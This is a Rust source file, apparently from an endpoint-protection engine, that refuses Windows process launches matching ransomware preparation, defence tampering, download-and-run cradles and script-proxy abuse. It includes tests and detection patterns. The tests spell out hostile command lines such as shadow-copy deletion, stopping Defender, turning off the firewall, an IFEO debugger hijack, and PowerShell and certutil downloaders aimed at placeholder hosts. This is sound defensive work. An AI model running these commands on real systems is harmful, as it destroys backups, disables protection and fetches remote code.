//! Rules on how programs are started.
//!
//! Much of what modern malware does runs through programs Windows ships: `vssadmin` deletes the
//! shadow copies ransomware does not want restored, `mshta` and `rundll32` run script fetched
//! from the web or stored in the registry, Office documents start PowerShell, and a command pasted
//! into the Run box (the "ClickFix" lure) downloads and runs a stealer. Every one of those
//! binaries is signed by Microsoft, so a signature or a file scan says nothing; the command line
//! does.
//!
//! The driver reports each process start with its command line and the process that created it.
//! [`judge_launch`] decides whether to refuse it. [`judge_autostart`] applies the same rules to a
//! command something registered to run at sign-in, which is where fileless malware such as
//! Poweliks and Kovter lives.
//!
//! Every rule is narrow on purpose: it names a binary and the arguments that make it harmful, not
//! the binary alone. Someone who really means to delete shadow copies can pause protection first.

/// A program about to start.
#[derive(Debug, Clone, Copy)]
pub struct Launch<'a> {
    /// Full path of the program being started.
    pub image: &'a str,
    /// Its whole command line, as the driver reported it.
    pub command_line: &'a str,
    /// Full path of the program that created it, when known.
    pub creator_image: Option<&'a str>,
}

/// Why a start is refused.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct RuleHit {
    /// The name shown as the threat, in the engine's `Family.Platform.Name` style.
    pub name: &'static str,
    /// One plain sentence for the history and the notification.
    pub reason: &'static str,
    /// The program that asked for this is itself the threat: ransomware getting ready to encrypt,
    /// or malware switching off defences. It is stopped and removed too, not just refused.
    pub convict_launcher: bool,
}

const fn hit(name: &'static str, reason: &'static str, convict_launcher: bool) -> RuleHit {
    RuleHit {
        name,
        reason,
        convict_launcher,
    }
}

const SHADOW_COPY_DELETION: RuleHit = hit(
    "Behavior.Win.ShadowCopyDeletion",
    "deleting shadow copies, which ransomware does before encrypting so files cannot be restored",
    true,
);
const BACKUP_DELETION: RuleHit = hit(
    "Behavior.Win.BackupDeletion",
    "deleting Windows backups, which ransomware does before encrypting",
    true,
);
const RECOVERY_DISABLED: RuleHit = hit(
    "Behavior.Win.RecoveryDisabled",
    "switching off Windows recovery, which ransomware does before encrypting",
    true,
);
const SAFE_MODE_BOOT: RuleHit = hit(
    "Behavior.Win.SafeModeReboot",
    "forcing the next start into Safe Mode, where ransomware encrypts with most protection off",
    true,
);
const FREE_SPACE_WIPE: RuleHit = hit(
    "Behavior.Win.FreeSpaceWipe",
    "wiping free disk space, which ransomware does so deleted originals cannot be recovered",
    true,
);
const MASS_PERMISSION_CHANGE: RuleHit = hit(
    "Behavior.Win.MassPermissionChange",
    "granting everyone full control of every file, which ransomware does before encrypting",
    true,
);
const LOG_CLEARING: RuleHit = hit(
    "Behavior.Win.LogClearing",
    "clearing the event logs or the change journal to hide what happened",
    true,
);
const SECURITY_TAMPERING: RuleHit = hit(
    "Behavior.Win.SecurityTampering",
    "stopping or disabling blackshard, Microsoft Defender or the firewall",
    true,
);
const REGISTRY_TAMPERING: RuleHit = hit(
    "Behavior.Win.RegistryTampering",
    "hijacking program launch or sign-in, or locking out Task Manager and the registry editor",
    true,
);
const FIREWALL_EXCEPTION: RuleHit = hit(
    "Behavior.Win.FirewallException",
    "opening the firewall for a program, as remote-access trojans do",
    true,
);
const DOWNLOAD_AND_RUN: RuleHit = hit(
    "Behavior.Win.DownloadAndRun",
    "downloading code and running it straight from memory",
    false,
);
const IN_MEMORY_LOADER: RuleHit = hit(
    "Behavior.Win.InMemoryLoader",
    "decoding a program and loading it straight into memory",
    false,
);
const REMOTE_SCRIPT: RuleHit = hit(
    "Behavior.Win.RemoteScriptProxy",
    "running script through a Windows program from the web or from inline code",
    false,
);
const REMOTE_INSTALL: RuleHit = hit(
    "Behavior.Win.QuietRemoteInstall",
    "quietly installing a package straight from the web",
    false,
);
const DOWNLOADER_ABUSE: RuleHit = hit(
    "Behavior.Win.DownloaderAbuse",
    "using a Windows tool to download or decode a file",
    false,
);
const OFFICE_CHILD: RuleHit = hit(
    "Behavior.Win.OfficeChildProcess",
    "an Office document starting a shell or script host, as malicious macros do",
    false,
);
const DOWNLOADED_SCRIPT: RuleHit = hit(
    "Behavior.Win.DownloadedScript",
    "running a script straight from Downloads, a temporary folder or an archive",
    false,
);
const AUTOIT_LOADER: RuleHit = hit(
    "Behavior.Win.AutoItLoader",
    "running a compiled AutoIt script from outside Program Files, as DarkGate-style loaders do",
    false,
);

/// Shells and script hosts: a document or a loader starting one of these is how code runs.
const SHELLS_AND_HOSTS: &[&str] = &[
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "powershell_ise.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "msiexec.exe",
    "schtasks.exe",
    "wmic.exe",
    "msbuild.exe",
    "installutil.exe",
    "regasm.exe",
    "regsvcs.exe",
    "curl.exe",
];

const OFFICE: &[&str] = &[
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
    "outlook.exe",
    "onenote.exe",
    "msaccess.exe",
    "mspub.exe",
    "visio.exe",
    "eqnedt32.exe",
];

/// The services and drivers whose stopping is an attack on the machine's defences.
const DEFENCES: &[&str] = &[
    "blackshard",
    "windefend",
    "wdnissvc",
    "wdfilter",
    "wdboot",
    "sense",
    "mpssvc",
    "securityhealthservice",
];

/// The lower-case file name of a path, with or without quotes around it.
fn file_name(path: &str) -> String {
    let trimmed = path.trim().trim_matches('"');
    trimmed
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(trimmed)
        .to_ascii_lowercase()
}

/// Splits a command line into lower-case words, keeping quoted runs together and dropping the
/// quotes. Approximate, but these rules only look for words and phrases.
fn words(command_line: &str) -> Vec<String> {
    split_keeping_case(command_line)
        .into_iter()
        .map(|word| word.to_ascii_lowercase())
        .collect()
}

/// The command line without the program's own path, lower case, with runs of spaces collapsed
/// and the quotes and carets cmd.exe would remove taken out, so `"delete"  shadows` and
/// `del^ete shadows` read as `delete shadows`.
fn arguments(command_line: &str) -> String {
    let words = words(&command_line.replace('^', ""));
    words.get(1..).unwrap_or_default().join(" ")
}

fn has_web_address(text: &str) -> bool {
    text.contains("http://") || text.contains("https://") || text.contains("ftp://")
}

/// Any of `options`, written with `/` or `-`.
fn has_option(arguments: &str, options: &[&str]) -> bool {
    options.iter().any(|option| {
        arguments.split(' ').any(|word| {
            let word = word.trim_start_matches(['/', '-']);
            word == *option || word.starts_with(&format!("{option}:"))
        })
    })
}

fn in_user_writable_place(path: &str) -> bool {
    let path = path.to_ascii_lowercase().replace('/', "\\");
    [
        "\\users\\",
        "\\programdata\\",
        "\\windows\\temp\\",
        "\\temp\\",
        "\\$recycle.bin\\",
    ]
    .iter()
    .any(|place| path.contains(place))
}

fn in_downloads_or_temp(path: &str) -> bool {
    let path = path.to_ascii_lowercase().replace('/', "\\");
    [
        "\\downloads\\",
        "\\appdata\\local\\temp\\",
        "\\windows\\temp\\",
        // Opening a script from inside a zip in Explorer extracts it here first.
        "\\temp1_",
        ".zip\\",
        "\\inetcache\\",
        // A WebDAV path, as SocGholish-style lures use.
        "@ssl\\",
        "\\davwwwroot\\",
    ]
    .iter()
    .any(|place| path.contains(place))
        || path.starts_with("\\\\")
}

/// PowerShell text that both fetches something from the web and runs what it fetched.
fn powershell_downloads_and_runs(text: &str) -> bool {
    let fetches = [
        "downloadstring",
        "downloaddata",
        "downloadfile",
        "invoke-webrequest",
        "invoke-restmethod",
        "iwr ",
        "irm ",
        "net.webclient",
        "start-bitstransfer",
        "system.net.http",
    ]
    .iter()
    .any(|word| text.contains(word));
    let runs = [
        "iex",
        "invoke-expression",
        "|iex",
        "| iex",
        ".invoke(",
        "&(",
        "& (",
    ]
    .iter()
    .any(|word| text.contains(word));
    fetches && runs
}

/// PowerShell text that decodes a program and loads it into memory, as AsyncRAT and AgentTesla
/// loaders do.
fn powershell_loads_from_memory(text: &str) -> bool {
    text.contains("frombase64string")
        && (text.contains("reflection.assembly")
            || text.contains("[reflection.assembly]")
            || text.contains("::load(")
            || text.contains("virtualalloc"))
}

/// The script inside `-EncodedCommand`, which PowerShell takes as base64 of UTF-16LE.
fn decoded_powershell(arguments: &str) -> Option<String> {
    let words: Vec<&str> = arguments.split(' ').collect();
    let position = words.iter().position(|word| {
        let option = word.trim_start_matches(['/', '-']);
        // -e, -ec, -enc ... -encodedcommand: PowerShell takes any unambiguous prefix, and -ec.
        option == "ec" || (option.starts_with('e') && "encodedcommand".starts_with(option))
    })?;
    let encoded = words.get(position + 1)?;
    let bytes = base64_decode(encoded)?;
    let units: Vec<u16> = bytes
        .as_chunks::<2>()
        .0
        .iter()
        .map(|pair| u16::from_le_bytes(*pair))
        .collect();
    Some(String::from_utf16_lossy(&units).to_ascii_lowercase())
}

/// Base64 is case-sensitive, so the caller passes text whose case was kept.
fn base64_decode(text: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.decode(text).ok()
}

/// Decides whether a program start is refused.
pub fn judge_launch(launch: &Launch<'_>) -> Option<RuleHit> {
    let program = file_name(launch.image);
    let arguments = arguments(launch.command_line);
    let creator = launch.creator_image.map(file_name);

    if let Some(creator) = &creator {
        if OFFICE.contains(&creator.as_str()) && SHELLS_AND_HOSTS.contains(&program.as_str()) {
            return Some(OFFICE_CHILD);
        }
    }

    match program.as_str() {
        "vssadmin.exe" => {
            if arguments.contains("delete shadows")
                || (arguments.contains("resize shadowstorage") && arguments.contains("maxsize"))
            {
                return Some(SHADOW_COPY_DELETION);
            }
        }
        "wmic.exe" => {
            if arguments.contains("shadowcopy") && arguments.contains("delete") {
                return Some(SHADOW_COPY_DELETION);
            }
        }
        "wbadmin.exe" => {
            if arguments.contains("delete catalog")
                || arguments.contains("delete systemstatebackup")
                || arguments.contains("delete backup")
            {
                return Some(BACKUP_DELETION);
            }
        }
        "bcdedit.exe" => {
            if arguments.contains("recoveryenabled no")
                || arguments.contains("bootstatuspolicy ignoreallfailures")
            {
                return Some(RECOVERY_DISABLED);
            }
            if arguments.contains("safeboot") && !arguments.contains("deletevalue") {
                return Some(SAFE_MODE_BOOT);
            }
        }
        "cipher.exe" => {
            if has_option(&arguments, &["w"]) {
                return Some(FREE_SPACE_WIPE);
            }
        }
        "icacls.exe" => {
            if arguments.contains("everyone:")
                && has_option(&arguments, &["t"])
                && (arguments.contains('*') || arguments.contains(":\\ "))
            {
                return Some(MASS_PERMISSION_CHANGE);
            }
        }
        "wevtutil.exe" => {
            if words(&arguments)
                .first()
                .is_some_and(|verb| verb == "cl" || verb == "clear-log")
            {
                return Some(LOG_CLEARING);
            }
        }
        "fsutil.exe" => {
            if arguments.contains("usn") && arguments.contains("deletejournal") {
                return Some(LOG_CLEARING);
            }
        }
        "sc.exe" | "net.exe" | "net1.exe" => {
            let words = words(&arguments);
            let verb = words
                .iter()
                .any(|word| matches!(word.as_str(), "stop" | "delete" | "config" | "pause"));
            if verb && words.iter().any(|word| DEFENCES.contains(&word.as_str())) {
                return Some(SECURITY_TAMPERING);
            }
        }
        "taskkill.exe" => {
            if ["blackshard", "msmpeng", "mssense", "securityhealth"]
                .iter()
                .any(|name| arguments.contains(name))
            {
                return Some(SECURITY_TAMPERING);
            }
        }
        "fltmc.exe" => {
            if (arguments.contains("unload") || arguments.contains("detach"))
                && (arguments.contains("blackshard") || arguments.contains("wdfilter"))
            {
                return Some(SECURITY_TAMPERING);
            }
        }
        "netsh.exe" => {
            if arguments.contains("state off")
                || arguments.contains("opmode disable")
                || arguments.contains("opmode mode=disable")
            {
                return Some(SECURITY_TAMPERING);
            }
            if arguments.contains("allowedprogram")
                || (arguments.contains("add rule")
                    && arguments.contains("action=allow")
                    && arguments.contains("program=")
                    && in_user_writable_place(&arguments))
            {
                return Some(FIREWALL_EXCEPTION);
            }
        }
        "reg.exe" => {
            let writes = arguments.starts_with("add") || arguments.starts_with("import");
            let hijacks_launch = arguments.contains("image file execution options")
                && (arguments.contains("debugger") || arguments.contains("monitorprocess"));
            let hijacks_sign_in = arguments.contains("\\winlogon")
                && (arguments.contains("/v shell") || arguments.contains("/v userinit"));
            let locks_out = [
                "disabletaskmgr",
                "disableregistrytools",
                "disablecmd",
                "disableantispyware",
                "disablerealtimemonitoring",
                "disablebehaviormonitoring",
            ]
            .iter()
            .any(|value| arguments.contains(value));
            if writes && (hijacks_launch || hijacks_sign_in || locks_out) {
                return Some(REGISTRY_TAMPERING);
            }
        }
        "powershell.exe" | "pwsh.exe" | "powershell_ise.exe" => {
            let mut texts = vec![arguments.clone()];
            if let Some(decoded) =
                decoded_powershell(&arguments_preserving_case(launch.command_line))
            {
                texts.push(decoded);
            }
            for text in &texts {
                if let Some(hit) = judge_powershell(text) {
                    return Some(hit);
                }
            }
        }
        "mshta.exe" => {
            if has_web_address(&arguments)
                || arguments.contains("javascript:")
                || arguments.contains("vbscript:")
                || arguments.contains("about:")
                || arguments.starts_with("\\\\")
            {
                return Some(REMOTE_SCRIPT);
            }
        }
        "rundll32.exe" => {
            if arguments.contains("javascript:")
                || arguments.contains("vbscript:")
                || arguments.contains("runhtmlapplication")
                || has_web_address(&arguments)
            {
                return Some(REMOTE_SCRIPT);
            }
        }
        "regsvr32.exe" => {
            if (arguments.contains("/i:") || arguments.contains("-i:"))
                && (has_web_address(&arguments) || arguments.contains("scrobj"))
            {
                return Some(REMOTE_SCRIPT);
            }
        }
        "msiexec.exe" => {
            if has_option(&arguments, &["q", "qn", "quiet", "qb", "passive"])
                && (has_web_address(&arguments) || arguments.contains("\\\\"))
            {
                return Some(REMOTE_INSTALL);
            }
        }
        "certutil.exe" => {
            if has_option(
                &arguments,
                &["urlcache", "verifyctl", "decode", "decodehex"],
            ) || (has_option(&arguments, &["split"]) && has_web_address(&arguments))
            {
                return Some(DOWNLOADER_ABUSE);
            }
        }
        "bitsadmin.exe" => {
            if (has_option(&arguments, &["transfer", "addfile"]) && has_web_address(&arguments))
                || has_option(&arguments, &["setnotifycmdline"])
            {
                return Some(DOWNLOADER_ABUSE);
            }
        }
        "wscript.exe" | "cscript.exe" => {
            let script = words(&arguments)
                .into_iter()
                .find(|word| !word.starts_with('/') && !word.starts_with("//"));
            if script.is_some_and(|script| in_downloads_or_temp(&script)) {
                return Some(DOWNLOADED_SCRIPT);
            }
        }
        "autoit3.exe" | "autoit3_x64.exe" => {
            let outside_program_files = !launch
                .image
                .to_ascii_lowercase()
                .contains("\\program files");
            let runs_script = words(&arguments)
                .iter()
                .any(|word| word.ends_with(".a3x") || word.ends_with(".au3"));
            if outside_program_files && runs_script {
                return Some(AUTOIT_LOADER);
            }
        }
        "schtasks.exe" => {
            // A task that would run something these rules refuse is refused when it is made.
            if let Some(action) = option_value(launch.command_line, "tr") {
                if let Some(hit) = judge_autostart(&action) {
                    return Some(hit);
                }
            }
        }
        _ => {}
    }
    None
}

fn judge_powershell(text: &str) -> Option<RuleHit> {
    if text.contains("win32_shadowcopy") && (text.contains("delete") || text.contains("remove-")) {
        return Some(SHADOW_COPY_DELETION);
    }
    if text.contains("set-mppreference")
        && [
            "-disablerealtimemonitoring",
            "-disablebehaviormonitoring",
            "-disableioavprotection",
            "-disablescriptscanning",
            "-disableblockatfirstseen",
            "-exclusionpath",
            "-exclusionprocess",
        ]
        .iter()
        .any(|option| text.contains(option))
        || (text.contains("add-mppreference") && text.contains("-exclusion"))
    {
        return Some(SECURITY_TAMPERING);
    }
    if powershell_downloads_and_runs(text) {
        return Some(DOWNLOAD_AND_RUN);
    }
    if powershell_loads_from_memory(text) {
        return Some(IN_MEMORY_LOADER);
    }
    None
}

/// The arguments with options (`-EncodedCommand`) lower-cased and every other word, such as
/// base64, left as it is.
fn arguments_preserving_case(command_line: &str) -> String {
    split_keeping_case(command_line)
        .get(1..)
        .unwrap_or_default()
        .iter()
        .map(|word| {
            if word.starts_with('-') || word.starts_with('/') {
                word.to_ascii_lowercase()
            } else {
                word.clone()
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

/// Splits a command line into words, keeping quoted runs together, dropping the quotes and
/// keeping case.
fn split_keeping_case(command_line: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut quoted = false;
    for character in command_line.chars() {
        match character {
            '"' => quoted = !quoted,
            ' ' | '\t' if !quoted => {
                if !current.is_empty() {
                    words.push(std::mem::take(&mut current));
                }
            }
            other => current.push(other),
        }
    }
    if !current.is_empty() {
        words.push(current);
    }
    words
}

/// The value after `/name` or `-name` in a command line, with quotes removed.
fn option_value(command_line: &str, name: &str) -> Option<String> {
    let words = split_keeping_case(command_line);
    let position = words.iter().position(|word| {
        word.trim_start_matches(['/', '-'])
            .eq_ignore_ascii_case(name)
    })?;
    words.get(position + 1).cloned()
}

/// Applies the rules to a command registered to run by itself: a Run value, a scheduled task's
/// action, a service's image or a WMI consumer's command. The program is taken from the start
/// of the command, and nothing is known about who will start it.
pub fn judge_autostart(command: &str) -> Option<RuleHit> {
    let command = command.trim();
    let image = if let Some(rest) = command.strip_prefix('"') {
        rest.split('"').next().unwrap_or(rest)
    } else {
        // Unquoted: the program ends at the first ".exe" or, failing that, the first space.
        let lower = command.to_ascii_lowercase();
        match lower.find(".exe") {
            Some(end) => &command[..end + 4],
            None => command.split(' ').next().unwrap_or(command),
        }
    };
    let image = if image.to_ascii_lowercase().ends_with(".exe") {
        image.to_owned()
    } else {
        format!("{image}.exe")
    };
    judge_launch(&Launch {
        image: &image,
        command_line: command,
        creator_image: None,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn start(image: &str, command_line: &str) -> Option<&'static str> {
        judge_launch(&Launch {
            image,
            command_line,
            creator_image: Some(r"C:\Windows\explorer.exe"),
        })
        .map(|hit| hit.name)
    }

    fn started_by(image: &str, command_line: &str, creator: &str) -> Option<&'static str> {
        judge_launch(&Launch {
            image,
            command_line,
            creator_image: Some(creator),
        })
        .map(|hit| hit.name)
    }

    const VSSADMIN: &str = r"C:\Windows\System32\vssadmin.exe";
    const POWERSHELL: &str = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";

    #[test]
    fn ransomware_preparation_is_refused_and_blames_the_launcher() {
        for (image, command_line) in [
            (VSSADMIN, "vssadmin.exe delete shadows /all /quiet"),
            (VSSADMIN, "vssadmin  \"Delete\"  Shadows /All /Quiet"),
            (
                VSSADMIN,
                "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB",
            ),
            (
                r"C:\Windows\System32\wbem\WMIC.exe",
                "wmic shadowcopy delete /nointeractive",
            ),
            (
                r"C:\Windows\System32\wbadmin.exe",
                "wbadmin delete catalog -quiet",
            ),
            (
                r"C:\Windows\System32\bcdedit.exe",
                "bcdedit /set {default} recoveryenabled No",
            ),
            (
                r"C:\Windows\System32\bcdedit.exe",
                "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
            ),
            (
                r"C:\Windows\System32\bcdedit.exe",
                "bcdedit /set {current} safeboot network",
            ),
            (r"C:\Windows\System32\cipher.exe", "cipher /w:C:\\"),
            (
                r"C:\Windows\System32\icacls.exe",
                "icacls \"C:\\*\" /grant Everyone:F /T /C /Q",
            ),
            (r"C:\Windows\System32\wevtutil.exe", "wevtutil cl Security"),
            (
                r"C:\Windows\System32\fsutil.exe",
                "fsutil usn deletejournal /d c:",
            ),
            (
                POWERSHELL,
                "powershell -c \"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\"",
            ),
        ] {
            let hit = judge_launch(&Launch {
                image,
                command_line,
                creator_image: Some(r"C:\Windows\System32\cmd.exe"),
            })
            .unwrap_or_else(|| panic!("{command_line} was allowed"));
            assert!(hit.convict_launcher, "{command_line}");
        }
    }

    #[test]
    fn obfuscation_cmd_removes_is_seen_through() {
        assert!(start(VSSADMIN, "vssadmin del^ete sha^dows /all").is_some());
    }

    #[test]
    fn tampering_with_defences_is_refused() {
        for (image, command_line) in [
            (r"C:\Windows\System32\sc.exe", "sc stop blackshard"),
            (r"C:\Windows\System32\sc.exe", "sc config WinDefend start= disabled"),
            (r"C:\Windows\System32\net.exe", "net stop \"Windows Defender\" & net stop windefend"),
            (r"C:\Windows\System32\taskkill.exe", "taskkill /f /im MsMpEng.exe"),
            (r"C:\Windows\System32\fltMC.exe", "fltmc unload blackshard"),
            (r"C:\Windows\System32\netsh.exe", "netsh advfirewall set allprofiles state off"),
            (
                POWERSHELL,
                "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
            ),
            (POWERSHELL, "powershell Add-MpPreference -ExclusionPath C:\\"),
            (
                r"C:\Windows\System32\reg.exe",
                "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /d cmd.exe",
            ),
            (
                r"C:\Windows\System32\reg.exe",
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f",
            ),
            (
                r"C:\Windows\System32\netsh.exe",
                "netsh firewall add allowedprogram \"C:\\Users\\x\\AppData\\Roaming\\svchost.exe\" \"svchost.exe\" ENABLE",
            ),
        ] {
            assert!(start(image, command_line).is_some(), "{command_line}");
        }
    }

    #[test]
    fn living_off_the_land_downloaders_and_script_proxies_are_refused() {
        for (image, command_line, name) in [
            (
                r"C:\Windows\System32\mshta.exe",
                "mshta https://example.test/verify.hta",
                "Behavior.Win.RemoteScriptProxy",
            ),
            (
                r"C:\Windows\System32\mshta.exe",
                "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\")",
                "Behavior.Win.RemoteScriptProxy",
            ),
            (
                r"C:\Windows\System32\rundll32.exe",
                "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()",
                "Behavior.Win.RemoteScriptProxy",
            ),
            (
                r"C:\Windows\System32\regsvr32.exe",
                "regsvr32 /s /n /u /i:http://example.test/file.sct scrobj.dll",
                "Behavior.Win.RemoteScriptProxy",
            ),
            (
                r"C:\Windows\System32\msiexec.exe",
                "msiexec /q /i http://example.test/a.msi",
                "Behavior.Win.QuietRemoteInstall",
            ),
            (
                r"C:\Windows\System32\certutil.exe",
                "certutil -urlcache -split -f http://example.test/a.exe a.exe",
                "Behavior.Win.DownloaderAbuse",
            ),
            (
                r"C:\Windows\System32\certutil.exe",
                "certutil -decode payload.b64 payload.exe",
                "Behavior.Win.DownloaderAbuse",
            ),
            (
                r"C:\Windows\System32\bitsadmin.exe",
                "bitsadmin /transfer job /download /priority high http://example.test/a.exe C:\\Users\\x\\a.exe",
                "Behavior.Win.DownloaderAbuse",
            ),
        ] {
            assert_eq!(start(image, command_line), Some(name), "{command_line}");
        }
    }

    #[test]
    fn clickfix_and_encoded_download_cradles_are_refused() {
        // Pasted into the Run box: Explorer starts it.
        assert_eq!(
            start(
                POWERSHELL,
                "powershell -w hidden -c \"iwr https://example.test/s.ps1 | iex\""
            ),
            Some("Behavior.Win.DownloadAndRun")
        );
        assert_eq!(
            start(
                POWERSHELL,
                "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('https://example.test/a')"
            ),
            Some("Behavior.Win.DownloadAndRun")
        );
        use base64::Engine;
        let script = "IEX (New-Object Net.WebClient).DownloadString('https://example.test/a')";
        let utf16: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
        let encoded = base64::engine::general_purpose::STANDARD.encode(utf16);
        assert_eq!(
            start(
                POWERSHELL,
                &format!("powershell.exe -NoP -NonI -W Hidden -Enc {encoded}")
            ),
            Some("Behavior.Win.DownloadAndRun")
        );
        assert_eq!(
            start(
                POWERSHELL,
                "powershell [Reflection.Assembly]::Load([Convert]::FromBase64String($a))"
            ),
            Some("Behavior.Win.InMemoryLoader")
        );
    }

    #[test]
    fn office_starting_a_shell_is_refused_but_office_opening_office_is_not() {
        let word = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE";
        assert_eq!(
            started_by(POWERSHELL, "powershell -c whoami", word),
            Some("Behavior.Win.OfficeChildProcess")
        );
        assert_eq!(
            started_by(r"C:\Windows\System32\cmd.exe", "cmd /c calc", word),
            Some("Behavior.Win.OfficeChildProcess")
        );
        assert_eq!(
            started_by(
                r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
                "excel.exe book.xlsx",
                word
            ),
            None
        );
        let hit = judge_launch(&Launch {
            image: POWERSHELL,
            command_line: "powershell",
            creator_image: Some(word),
        })
        .unwrap();
        assert!(!hit.convict_launcher, "Word itself is not the threat");
    }

    #[test]
    fn scripts_run_from_downloads_temp_or_archives_are_refused() {
        let wscript = r"C:\Windows\System32\wscript.exe";
        for command_line in [
            "wscript.exe \"C:\\Users\\x\\Downloads\\Chrome.Update.js\"",
            "wscript.exe C:\\Users\\x\\AppData\\Local\\Temp\\Temp1_invoice.zip\\invoice.js",
            "wscript.exe //B \\\\example.test@SSL\\DavWWWRoot\\a.vbs",
        ] {
            assert_eq!(
                start(wscript, command_line),
                Some("Behavior.Win.DownloadedScript"),
                "{command_line}"
            );
        }
        assert_eq!(
            start(wscript, "wscript.exe C:\\Scripts\\backup.vbs"),
            None,
            "a script kept in a folder of its own is left alone"
        );
    }

    #[test]
    fn autoit_loaders_are_refused_only_outside_program_files() {
        assert_eq!(
            start(
                r"C:\temp\Autoit3.exe",
                "C:\\temp\\Autoit3.exe C:\\temp\\script.a3x"
            ),
            Some("Behavior.Win.AutoItLoader")
        );
        assert_eq!(
            start(
                r"C:\Program Files (x86)\AutoIt3\AutoIt3.exe",
                "AutoIt3.exe C:\\work\\build.au3"
            ),
            None
        );
    }

    #[test]
    fn ordinary_administration_is_allowed() {
        for (image, command_line) in [
            (VSSADMIN, "vssadmin list shadows"),
            (r"C:\Windows\System32\bcdedit.exe", "bcdedit /enum"),
            (r"C:\Windows\System32\bcdedit.exe", "bcdedit /deletevalue {current} safeboot"),
            (r"C:\Windows\System32\sc.exe", "sc query blackshard"),
            (r"C:\Windows\System32\sc.exe", "sc stop spooler"),
            (r"C:\Windows\System32\net.exe", "net use z: \\\\server\\share"),
            (r"C:\Windows\System32\cipher.exe", "cipher /e secret.txt"),
            (r"C:\Windows\System32\icacls.exe", "icacls file.txt /grant alice:R"),
            (POWERSHELL, "powershell -c Get-Process"),
            (POWERSHELL, "powershell Invoke-WebRequest https://example.test -OutFile a.zip"),
            (r"C:\Windows\System32\msiexec.exe", "msiexec /i C:\\setup\\app.msi /qn"),
            (r"C:\Windows\System32\mshta.exe", "mshta C:\\Tools\\menu.hta"),
            (r"C:\Windows\System32\rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL"),
            (
                r"C:\Windows\System32\netsh.exe",
                "netsh advfirewall firewall add rule name=web dir=in action=allow protocol=TCP localport=80",
            ),
            (r"C:\Windows\System32\reg.exe", "reg query HKLM\\Software"),
            (r"C:\Windows\System32\certutil.exe", "certutil -hashfile setup.exe SHA256"),
            (r"C:\Windows\System32\wevtutil.exe", "wevtutil qe System /c:5"),
        ] {
            assert_eq!(start(image, command_line), None, "{command_line}");
        }
    }

    #[test]
    fn autostarts_are_judged_by_the_program_they_name() {
        // Poweliks and Kovter keep their payload in a Run value like these.
        assert!(judge_autostart(
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"...\")"
        )
        .is_some());
        assert!(judge_autostart(
            "\"C:\\Windows\\System32\\mshta.exe\" \"javascript:a=new ActiveXObject('WScript.Shell');\""
        )
        .is_some());
        assert!(
            judge_autostart("powershell -w hidden -c \"iex (iwr https://example.test/p)\"")
                .is_some()
        );
        assert!(judge_autostart("\"C:\\Program Files\\App\\app.exe\" /background").is_none());
        assert!(judge_autostart("C:\\Windows\\System32\\SecurityHealthSystray.exe").is_none());
    }

    #[test]
    fn a_scheduled_task_that_would_run_a_refused_command_is_refused() {
        assert!(start(
            r"C:\Windows\System32\schtasks.exe",
            "schtasks /create /sc minute /tn upd /tr \"mshta https://example.test/a.hta\""
        )
        .is_some());
        assert!(start(
            r"C:\Windows\System32\schtasks.exe",
            "schtasks /create /sc daily /tn backup /tr \"C:\\Tools\\backup.exe\""
        )
        .is_none());
    }
}
